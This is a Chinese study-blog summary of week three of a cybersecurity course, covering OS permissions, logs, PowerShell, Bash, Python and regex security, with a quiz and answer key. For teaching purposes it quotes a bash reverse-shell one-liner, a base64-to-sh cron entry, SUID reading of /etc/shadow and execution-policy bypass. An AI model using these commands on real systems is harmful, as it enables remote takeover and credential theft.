---
title: Week 03：操作系统与脚本 - 周度总结
tags:
  - 学习总结
  - 阶段复盘
categories:
  - 网络安全
date: 2026-02-12
---

# Week 03：操作系统与脚本 - 周度总结

## 📅 本周学习概览

本周我们从“网络传输”的虚空落地到了“操作系统”的实地。如果说前两周是在防御外部的攻城锤，那么这一周就是在肃清城内的内鬼和加固城墙。

我们深入了 **Linux** 和 **Windows** 的心脏，掌握了权限管理的精髓；更重要的是，我们拿起了 **Shell**, **Python**, **正则** 这三把利剑，不仅学会了如何自动化巡检，还学会了如何看穿黑客留下的恶意脚本。这是从“运维”向“安全”转型的关键一步。

<!--more-->

---

## 📚 每日核心知识回顾

### Day 015：Linux 安全基础
- **权限模型**：一切皆文件。`rwx` (421) 决定生死，`SUID` 是提权暗门。
- **账号管理**：`/etc/shadow` 是存放密码哈希的禁地，严禁 `Others` 可读。
- **日志审计**：`/var/log/auth.log` 是抓捕暴力破解者的第一现场。
- **加固核心**：最小权限原则。Root 能不登就不登，Sudo 能少给就少给。

### Day 016：Windows 安全基础
- **身份标识**：系统只认 **SID** 不认用户名。500 是 Administrator，1000+ 是打工仔。
- **ACL (访问控制)**：拒绝权限 > 允许权限。继承权限方便管理但易留隐患。
- **日志取证**：**Event ID 4625** (登录失败) 是暴力破解的报警灯。
- **高危端口**：`445` (SMB) 和 `3389` (RDP) 是勒索病毒的最爱，没事别开公网。

### Day 017：PowerShell 安全基础
- **执行策略**：`ExecutionPolicy` 只是个门把手，不是防盗门。`Bypass` 随便绕。
- **无文件攻击**：黑客利用 PowerShell 在内存中直接运行代码，不落地文件，逃避杀毒。
- **恶意特征**：看到 `IEX` (Invoke-Expression) 和 `-Enc` (Base64编码) 就要警铃大作。

### Day 018：Bash 脚本编程安全
- **反弹 Shell**：`bash -i >& /dev/tcp/ip/port 0>&1`，一行代码就能交出控制权。
- **安全编码**：变量必须加双引号 `"$VAR"`，防止空格导致的文件误删 (`rm -rf /`)。
- **痕迹清除**：黑客喜欢用 `history -c` 或在命令前加空格来隐藏行踪。

### Day 019：Python 安全编程基础
- **网络编程**：`socket` 是底层，`requests` 是神器。自己写扫描器其实很简单。
- **反序列化漏洞**：`pickle` 居然能执行任意命令！永远不要解包不可信的数据。
- **Scapy**：能像搭积木一样构造任意数据包，是协议分析和攻击模拟的瑞士军刀。

### Day 020：正则表达式在安全中的应用
- **万能提取**：`\d` (数字), `\w` (字符), `.` (任意)。
- **贪婪与懒惰**：`.*` 吃到撑，`.*?` 尝一口。提取数据多用懒惰模式。
- **ReDoS**：写得烂的正则（嵌套量词）会让 CPU 跑到 100%，导致拒绝服务。

### Day 021：脚本分析与自动化安全检查
- **威胁狩猎**：用 `grep` + 正则在海量日志中定位 SQL 注入 (`union select`) 或 爆破 IP。
- **去混淆**：Base64 是最常见的“遮羞布”，`echo ... | base64 -d` 即可还原真相。
- **自动化**：把重复的人工检查写成脚本，让机器替你 24 小时站岗。

---

## 📝 巩固练习题 (Level 3)

完成以下题目来检验你对第三周内容的掌握程度。

### 一、 概念速查（单选/简答）

1.  **在 Linux 中，权限 `755` 代表什么？**
    A) 所有者可写，其他人可读
    B) 所有者可读写执行，组和其他人可读执行
    C) 所有人都可以读写执行
    D) 只有 root 可以读写
2.  **Windows 日志中，哪个 Event ID 代表“登录失败”？**
    A) 4624
    B) 4625
    C) 1102
    D) 4688
3.  **以下哪个 PowerShell 参数常被恶意脚本用来绕过执行策略？**
    A) `-NoProfile`
    B) `-WindowStyle Hidden`
    C) `-ExecutionPolicy Bypass`
    D) `-Command`
4.  **Bash 脚本中，为了防止变量为空导致 `rm -rf $DIR/` 误删根目录，应该怎么写？**
    A) `rm -rf $DIR/`
    B) `rm -rf "$DIR"/`
    C) `rm -rf "${DIR:?}"/`
    D) `rm -rf '$DIR'/`
5.  **Python 的 `pickle.loads()` 函数存在什么安全风险？**
    A) SQL 注入
    B) 跨站脚本 (XSS)
    C) 远程代码执行 (RCE)
    D) 缓冲区溢出

### 二、 场景分析（实战模拟）

6.  **场景：Linux 提权**
    你在渗透测试中发现了一台 Linux 服务器，普通用户 `bob` 可以运行一个叫 `/usr/bin/cat` 的命令，且该命令有 `s` 权限位（`-rwsr-xr-x`）。
    *   这意味着什么？
    *   你可以利用它做什么？（例如读取 `/etc/shadow`）

7.  **场景：恶意代码分析**
    你在服务器的定时任务里发现了这样一行命令：
    `*/1 * * * * echo "YmFzaA==" | base64 -d | sh`
    *   它在干什么？
    *   解码后的命令是什么？
    *   为什么要用 base64？

8.  **场景：ReDoS 攻击**
    你写了一个正则来验证用户邮箱，结果服务器 CPU 突然飙升到 100%，经查是因为某个用户输入了一串超长的乱码。
    *   这可能是什么攻击？
    *   什么样的正则容易导致这个问题？

### 三、 深度思考

9.  **为什么说“基于签名的杀毒软件（黑名单）”已经过时了？结合本周学的“脚本混淆”和“无文件攻击”谈谈你的看法。**

---

## 🔑 参考答案

### 一、 概念速查
1.  **B**。7=4(r)+2(w)+1(x)，5=4(r)+1(x)。
2.  **B**。4624 是成功，4625 是失败。
3.  **C**。Bypass 是最直接的。
4.  **C**。`:?` 会在变量为空时报错并停止脚本，最安全。
5.  **C**。反序列化过程可以执行构造好的恶意字节码。

### 二、 场景分析
6.  **SUID 提权**。
    *   这意味着 `cat` 命令在执行时，拥有其所有者（通常是 root）的权限，而不是调用者 `bob` 的权限。
    *   你可以运行 `/usr/bin/cat /etc/shadow`。虽然 `bob` 无权读 shadow，但 `cat` 有 root 权限，所以能读出来。你拿到了 root 的密码哈希。
7.  **混淆的恶意任务**。
    *   它每分钟执行一次。
    *   `YmFzaA==` 解码后是 `bash`。所以它在执行 `bash | sh`，可能是尝试启动一个 shell。实际场景中通常是一长串反弹 shell 的代码。
    *   用 base64 是为了躲避简单的关键字检测（如检测脚本里有没有 "bash" 字符串）。
8.  **ReDoS (正则拒绝服务)**。
    *   正则引擎在处理嵌套量词（如 `(a+)+`）且匹配失败时，会进行大量的回溯计算。
    *   攻击者利用这一点，发送精心构造的字符串，耗尽服务器 CPU 资源。

### 三、 深度思考
9.  **因为“特征”太容易改变了**。
    *   **混淆**：黑客稍微改改变量名，或者加一层 Base64 编码，文件的哈希值就变了，基于特征库的杀毒软件就认不出来了。
    *   **无文件攻击**：PowerShell 可以直接在内存运行恶意代码，根本不落地成文件，杀毒软件扫描硬盘根本扫不到。
    *   **结论**：现代安全防御必须转向**行为分析**（EDR），比如“不管你长什么样，只要你打开 Word 后立刻去连网下载 exe 并运行，我就杀掉你”。
